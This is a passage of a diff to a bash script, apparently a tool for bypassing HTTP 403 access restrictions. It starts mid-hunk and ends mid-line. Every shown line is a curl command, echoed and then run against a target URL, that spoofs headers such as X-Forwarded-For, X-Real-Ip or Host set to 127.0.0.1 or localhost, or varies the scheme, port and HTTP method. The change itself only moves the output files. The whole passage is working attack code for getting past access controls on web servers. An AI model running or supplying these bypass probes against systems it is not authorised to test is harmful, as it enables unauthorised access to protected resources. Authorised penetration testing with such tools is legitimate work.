-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Referrer: 127.0.0.1" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Referrer: 127.0.0.1" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Referrer: 127.0.0.1" -X GET "$URL" -H "$user_agent")
 print
 echo -n "Request-Uri Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Request-Uri: 127.0.0.1" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Request-Uri: 127.0.0.1" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Request-Uri: 127.0.0.1" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Request-Uri: 127.0.0.1" -X GET "$URL" -H "$user_agent")
 print
 echo -n "Uri Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Uri: 127.0.0.1" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Uri: 127.0.0.1" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Uri: 127.0.0.1" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Uri: 127.0.0.1" -X GET "$URL" -H "$user_agent")
 print
 echo -n "Url Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Url: 127.0.0.1" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Url: 127.0.0.1" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Url: 127.0.0.1" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Url: 127.0.0.1" -X GET "$URL" -H "$user_agent")
 print
 echo -n "X-Forward-For Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forward-For: 127.0.0.1" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forward-For: 127.0.0.1" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forward-For: 127.0.0.1" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forward-For: 127.0.0.1" -X GET "$URL" -H "$user_agent")
 print
 echo -n "X-Forwarded-By Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-By: 127.0.0.1" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-By: 127.0.0.1" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-By: 127.0.0.1" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-By: 127.0.0.1" -X GET "$URL" -H "$user_agent")
 print
 echo -n "X-Forwarded-For-Original Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-For-Original: 127.0.0.1" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-For-Original: 127.0.0.1" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-For-Original: 127.0.0.1" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-For-Original: 127.0.0.1" -X GET "$URL" -H "$user_agent")
 print
 echo -n "X-Forwarded-Server Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Server: 127.0.0.1" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Server: 127.0.0.1" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Server: 127.0.0.1" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Server: 127.0.0.1" -X GET "$URL" -H "$user_agent")
 print
 echo -n "X-Forwarded Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded: 127.0.0.1" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded: 127.0.0.1" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded: 127.0.0.1" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded: 127.0.0.1" -X GET "$URL" -H "$user_agent")
 print
 echo -n "X-Forwarder-For Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarder-For: 127.0.0.1" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarder-For: 127.0.0.1" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarder-For: 127.0.0.1" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarder-For: 127.0.0.1" -X GET "$URL" -H "$user_agent")
 print
 echo -n "X-Http-Destinationurl Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Http-Destinationurl: 127.0.0.1" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Http-Destinationurl: 127.0.0.1" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Http-Destinationurl: 127.0.0.1" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Http-Destinationurl: 127.0.0.1" -X GET "$URL" -H "$user_agent")
 print
 echo -n "X-Http-Host-Override Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Http-Host-Override: 127.0.0.1" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Http-Host-Override: 127.0.0.1" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Http-Host-Override: 127.0.0.1" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Http-Host-Override: 127.0.0.1" -X GET "$URL" -H "$user_agent")
 print
 echo -n "X-Original-Remote-Addr Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Original-Remote-Addr: 127.0.0.1" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Original-Remote-Addr: 127.0.0.1" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Original-Remote-Addr: 127.0.0.1" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Original-Remote-Addr: 127.0.0.1" -X GET "$URL" -H "$user_agent")
 print
 echo -n "X-Proxy-Url Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Proxy-Url: 127.0.0.1" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Proxy-Url: 127.0.0.1" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Proxy-Url: 127.0.0.1" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Proxy-Url: 127.0.0.1" -X GET "$URL" -H "$user_agent")
 print
 echo -n "X-Real-Ip Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Real-Ip: 127.0.0.1" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Real-Ip: 127.0.0.1" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Real-Ip: 127.0.0.1" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Real-Ip: 127.0.0.1" -X GET "$URL" -H "$user_agent")
 print
 echo -n "X-Remote-Addr Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Remote-Addr: 127.0.0.1" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Remote-Addr: 127.0.0.1" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Remote-Addr: 127.0.0.1" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Remote-Addr: 127.0.0.1" -X GET "$URL" -H "$user_agent")
 print
 echo -n "Host: <empty> Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Host: " -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Host: " -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Host: " -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Host: " -X GET "$URL" -H "$user_agent")
 print
 echo -n "Host: localhost Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Host: localhost" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Host: localhost" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Host: localhost" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Host: localhost" -X GET "$URL" -H "$user_agent")
 print
 echo -n "Host: 127.0.0.1 Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Host: 127.0.0.1" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Host: 127.0.0.1" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Host: 127.0.0.1" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Host: 127.0.0.1" -X GET "$URL" -H "$user_agent")
 print
 echo -n "Host: 0.0.0.0 Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Host: 0.0.0.0" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Host: 0.0.0.0" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Host: 0.0.0.0" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Host: 0.0.0.0" -X GET "$URL" -H "$user_agent")
 print
 echo -n "X-OReferrer Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-OReferrer: https%3A%2F%2Fwww.google.com%2F" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-OReferrer: https%3A%2F%2Fwww.google.com%2F" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-OReferrer: https%3A%2F%2Fwww.google.com%2F" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-OReferrer: https%3A%2F%2Fwww.google.com%2F" -X GET "$URL" -H "$user_agent")
 print
 
 
@@ -309,20 +305,20 @@ echo -e ${blue}"-------------------------"${end}
 echo -e ${cyan}"[+] Protocol Based Bypass"${end}
 echo -e ${blue}"-------------------------"${end}
 echo -n "HTTP Scheme Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -X GET "http://$domain/$path" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -X GET "http://$domain/$path" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -X GET "http://$VHOST/$PAT" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -X GET "http://$VHOST/$PAT" -H "$user_agent")
 print
 echo -n "HTTPs Scheme Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -X GET "https://$domain/$path" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -X GET "https://$domain/$path" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -X GET "https://$VHOST/$PAT" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -X GET "https://$VHOST/$PAT" -H "$user_agent")
 print
 echo -n "X-Forwarded-Scheme HTTP Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Scheme: http" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Scheme: http" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Scheme: http" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Scheme: http" -X GET "$URL" -H "$user_agent")
 print
 echo -n "X-Forwarded-Scheme HTTPs Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Scheme: https" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Scheme: https" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Scheme: https" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Scheme: https" -X GET "$URL" -H "$user_agent")
 print
 
 
@@ -331,24 +327,24 @@ echo -e ${blue}"-------------------------"${end}
 echo -e ${cyan}"[+] Port Based Bypass"${end}
 echo -e ${blue}"-------------------------"${end}
 echo -n "X-Forwarded-Port 443 Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 443" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 443" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 443" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 443" -X GET "$URL" -H "$user_agent")
 print
 echo -n "X-Forwarded-Port 4443 Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 4443" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 4443" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 4443" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 4443" -X GET "$URL" -H "$user_agent")
 print
 echo -n "X-Forwarded-Port 80 Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 80" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 80" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 80" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 80" -X GET "$URL" -H "$user_agent")
 print
 echo -n "X-Forwarded-Port 8080 Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 8080" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 8080" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 8080" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 8080" -X GET "$URL" -H "$user_agent")
 print
 echo -n "X-Forwarded-Port 8443 Payload:"
-echo curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 8443" -X GET "$URL" -H "$user_agent"
-code=$(curl --path-as-is -skg -o "$outdir/$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 8443" -X GET "$URL" -H "$user_agent")
+echo curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 8443" -X GET "$URL" -H "$user_agent"
+code=$(curl --path-as-is -skg -o "$(date +%s).html" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded-Port: 8443" -X GET "$URL" -H "$user_agent")
 print
 
 
@@ -356,1038 +352,1036 @@ echo -e ${blue}"----------------------"${end}
 echo -e ${cyan}"[+] HTTP Method Bypass"${end}
 echo -e ${blue}"----------------------"${end}
 echo -n "GET : "
-echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -H "$user_agent" -X GET
-code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -H "$user_agent" -X GET)
+echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s).html" -H "$user_agent" -X GET
+code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s).html" -H "$user_agent" -X GET)
 print
 echo -n "POST : "
-echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -H "$user_agent" -X POST
-code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -H "$user_agent" -X POST)
+echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s).html" -H "$user_agent" -X POST
+code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s).html" -H "$user_agent" -X POST)
 print
 echo -n "HEAD :"
-echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -I -H "$user_agent"
-code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -I -H "$user_agent")
+echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s).html" -I -H "$user_agent"
+code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s).html" -I -H "$user_agent")
 print
 echo -n "OPTIONS : "
-echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -H "$user_agent" -X OPTIONS
-code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -H "$user_agent" -X OPTIONS)
+echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s).html" -H "$user_agent" -X OPTIONS
+code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s).html" -H "$user_agent" -X OPTIONS)
 print
 echo -n "PUT : "
-echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -H "$user_agent" -X PUT
-code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -H "$user_agent" -X PUT)
+echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s).html" -H "$user_agent" -X PUT
+code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s).html" -H "$user_agent" -X PUT)
 print
 echo -n "TRACE : "
-echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -H "$user_agent" -X TRACE
-code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -H "$user_agent" -X TRACE)
+echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s).html" -H "$user_agent" -X TRACE
+code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s).html" -H "$user_agent" -X TRACE)
 print
 echo  -n "PATCH : "
-echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -H "$user_agent" -X PATCH
-code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -H "$user_agent" -X PATCH)
+echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s).html" -H "$user_agent" -X PATCH
+code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s).html" -H "$user_agent" -X PATCH)
 print
 echo  -n "TRACK : "
-echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -H "$user_agent" -X TRACK
-code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -H "$user_agent" -X TRACK)
+echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s).html" -H "$user_agent" -X TRACK
+code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s).html" -H "$user_agent" -X TRACK)
 print
 echo  -n "CONNECT : "
-echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -H "$user_agent" -X CONNECT
-code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -H "$user_agent" -X CONNECT)
+echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s).html" -H "$user_agent" -X CONNECT
+code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s).html" -H "$user_agent" -X CONNECT)
 print
 echo  -n "UPDATE : "
-echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$outdir/$(date +%s).html" -H "$user_agent" -X UPDATE
